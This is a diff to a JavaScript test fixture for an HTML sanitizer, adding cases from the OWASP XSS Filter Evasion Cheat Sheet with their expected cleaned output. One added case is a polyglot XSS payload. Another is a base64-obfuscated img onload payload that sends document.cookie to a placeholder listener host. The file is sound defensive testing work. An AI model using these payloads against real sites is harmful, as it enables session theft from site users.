@@ -3,7 +3,7 @@
  |
  | Using examples from the XSS Filter Evasion Cheat Sheet (https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
  | by Robert "RSnake" Hansen
- | Last revision (mm/dd/yy): 3/6/2018
+ | Last revision (mm/dd/yy): 7/4/2018
  | License: Attribution-ShareAlike 4.0 International (CC BY-SA 4.0) (https://creativecommons.org/licenses/by-sa/4.0/)
 */
 define(["require", "exports"], function (require, exports) {
@@ -22,6 +22,10 @@ define(["require", "exports"], function (require, exports) {
             'label': 'XSS Locator (short)',
             'example': '\'\';!--"<XSS>=&()}',
             'expectedCleaned': ['\'\';!--"=&amp;()}']
+        }, {
+            'label': 'XSS Locator (polygot)',
+            'example': 'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
+            'expectedCleaned': ['javascript:/*--&gt;']
         }, {
             'label': 'Plaintext',
             'example': '<PLAINTEXT>',
@@ -410,6 +414,10 @@ define(["require", "exports"], function (require, exports) {
             'label': 'URL string evasion: Octal encoding',
             'example': '<A HREF="http://0102.0146.0007.00000223/">XSS</A>',
             'expectedCleaned': ['XSS']
+        }, {
+            'label': 'URL string evasion: Base64 encoding',
+            'example': '<img onload="eval(atob(\'ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU=\'))">',
+            'expectedCleaned': ['']
         }, {
             'label': 'URL string evasion: Mixed encoding',
             'example': '<A HREF="h\ntt\tp://6\t6.000146.0x7.147/">XSS</A>',
